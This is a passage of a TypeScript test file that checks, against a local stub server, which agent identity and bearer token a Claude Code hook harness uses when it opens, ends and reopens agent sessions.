    assert.match(started.stdout, new RegExp(first.session_id ?? 'no session id'));

    assert.equal((await h.run('stop', 'omni-1')).code, 0);
    // The state reads `ended` before the end is sent (`endSession`): wait for the request.
    const ends = await until('the session to be ended on the board at Stop', () => {
      const sent = board.requests.filter(
        (q) => q.path === `/api/v1/agent-sessions/${first.session_id ?? ''}/end`,
      );
      return sent.length > 0 ? sent : undefined;
    });
    assert.equal(stateOf(home, 'omni-1').status, 'ended');
    assert.equal(ends.length, 1);
    assert.equal(ends[0]?.auth, `Bearer ${OMNI_TOKEN}`);

    const next = await h.run('prompt', 'omni-1');
    assert.equal(next.code, 0);
    const second = stateOf(home, 'omni-1');
    assert.equal(second.status, 'live');
    assert.notEqual(second.session_id, first.session_id, 'the ended session was not replaced');
    assert.equal(starts().length, 2);
    assert.match(next.stdout, new RegExp(second.session_id ?? 'no session id'));
  });

  void test('B1: an Omnigent run whose Claude Code MCP is the older helper opens as Claude Code, and still ends at Stop', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['omnigent', 'claude-code']);
    claudeJson(home, OLDER(board.url));
    const h = startHarness(home, bin, { OMNIGENT: '1' });

    assert.equal((await h.run('session-start', 'old-1')).code, 0);
    const first = stateOf(home, 'old-1');
    const start = board.requests.find((q) => q.path === '/api/v1/agent-sessions');
    assert.equal(
      start?.auth,
      `Bearer ${CLAUDE_TOKEN}`,
      'the hooks switched to the Omnigent agent while the MCP still sends Claude Code’s token',
    );
    assert.equal((await h.run('stop', 'old-1')).code, 0);
    const ends = await until('the session to be ended on the board at Stop', () => {
      const sent = board.requests.filter(
        (q) => q.path === `/api/v1/agent-sessions/${first.session_id ?? ''}/end`,
      );
      return sent.length > 0 ? sent : undefined;
    });
    assert.equal(ends[0]?.auth, `Bearer ${CLAUDE_TOKEN}`);
  });

  void test('no omnigent.json on this device: an Omnigent run keeps LAI-542’s behaviour — its session lives on at Stop (review #5/#6)', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['claude-code']);
    claudeJson(home, SWITCHING(board.url));
    const h = startHarness(home, bin, { OMNIGENT: '1' });

    assert.equal((await h.run('session-start', 'nodev-1')).code, 0);
    const first = stateOf(home, 'nodev-1');
    assert.equal(
      board.requests.find((q) => q.path === '/api/v1/agent-sessions')?.auth,
      `Bearer ${CLAUDE_TOKEN}`,
    );
    assert.equal((await h.run('stop', 'nodev-1')).code, 0);
    await new Promise((resolve) => setTimeout(resolve, 1500));
    assert.equal(stateOf(home, 'nodev-1').status, 'live');
    assert.ok(
      !board.requests.some((q) => q.path.endsWith('/end')),
      'a session was ended at Stop on a device that never set up Omnigent',
    );
    assert.equal((await h.run('prompt', 'nodev-1')).code, 0);
    assert.equal(stateOf(home, 'nodev-1').session_id, first.session_id);
  });

  void test('B2: polly’s own turn through the real hook opens as the Omnigent agent under a person’s entry and a worktree .mcp.json', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['omnigent', 'claude-code']);
    claudeJson(home, PERSONS(board.url));
    const wt = join(home, 'wt');
    mkdirSync(wt);
    writeFileSync(
      join(wt, '.mcp.json'),
      JSON.stringify({ mcpServers: { laika: PERSONS(board.url) } }),
    );
    const h = startHarness(home, bin, { OMNIGENT: '1', CLAUDE_CODE_ENTRYPOINT: 'sdk-py' });

    assert.equal((await h.run('session-start', 'polly-1', wt)).code, 0);
    assert.equal(
      board.requests.find((q) => q.path === '/api/v1/agent-sessions')?.auth,
      `Bearer ${OMNI_TOKEN}`,
      'polly’s own turn did not open as the Omnigent agent its bridge speaks as',
    );
    assert.equal(stateOf(home, 'polly-1').identity, 'omnigent');
  });

  void test('N1: the identity is decided once — moving into a folder whose .mcp.json defines laika changes nothing, Stop’s end and the reopen included', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['omnigent', 'claude-code']);
    claudeJson(home, SWITCHING(board.url));
    // The Laika repository's own plugin/.mcp.json defines laika.
    const plugin = join(home, 'laika', 'plugin');
    mkdirSync(plugin, { recursive: true });
    writeFileSync(
      join(plugin, '.mcp.json'),
      JSON.stringify({ mcpServers: { laika: PERSONS(board.url) } }),
    );
    const h = startHarness(home, bin, { OMNIGENT: '1' });

    assert.equal((await h.run('session-start', 'move-1', home)).code, 0);
    const first = stateOf(home, 'move-1');
    assert.equal(first.identity, 'omnigent');
    const starts = () => board.requests.filter((q) => q.path === '/api/v1/agent-sessions');
    assert.equal(starts()[0]?.auth, `Bearer ${OMNI_TOKEN}`);

    // Stop, working in the plugin folder: the end still speaks for the session's agent.
    assert.equal((await h.run('stop', 'move-1', plugin)).code, 0);
    const ends = await until('the end at Stop', () => {
      const sent = board.requests.filter(
        (q) => q.path === `/api/v1/agent-sessions/${first.session_id ?? ''}/end`,
      );
      return sent.length > 0 ? sent : undefined;
    });
    assert.equal(
      ends[0]?.auth,
      `Bearer ${OMNI_TOKEN}`,
      'the end at Stop was sent as another agent',
    );

    // The next prompt, still there, reopens as the same agent, and records it again.
    assert.equal((await h.run('prompt', 'move-1', plugin)).code, 0);
    assert.equal(starts().length, 2);
    assert.equal(starts()[1]?.auth, `Bearer ${OMNI_TOKEN}`, 'the reopen changed agent');
    assert.equal(stateOf(home, 'move-1').identity, 'omnigent');
  });

  void test('a plain run on the same device acts as its own agent and keeps its session at Stop', async () => {
    const r = root();
    const home = join(r, 'home');
    const bin = join(r, 'bin');
    mkdirSync(bin);
    symlinkSync(process.execPath, join(bin, 'claude'));
    const board = await stubBoard();
    credentials(home, board.url, ['omnigent', 'claude-code']);
    claudeJson(home, SWITCHING(board.url));
    const h = startHarness(home, bin, {});

    assert.equal((await h.run('session-start', 'plain-1')).code, 0);
    const first = stateOf(home, 'plain-1');
    const start = board.requests.find((q) => q.path === '/api/v1/agent-sessions');
    assert.equal(start?.auth, `Bearer ${CLAUDE_TOKEN}`);
    assert.equal((await h.run('stop', 'plain-1')).code, 0);
    await new Promise((resolve) => setTimeout(resolve, 1500));
    assert.equal(stateOf(home, 'plain-1').status, 'live');
    assert.ok(
      !board.requests.some((q) => q.path.endsWith('/end')),
      'a plain session was ended at Stop',
    );
    assert.equal((await h.run('prompt', 'plain-1')).code, 0);
    assert.equal(stateOf(home, 'plain-1').session_id, first.session_id);
  });
});
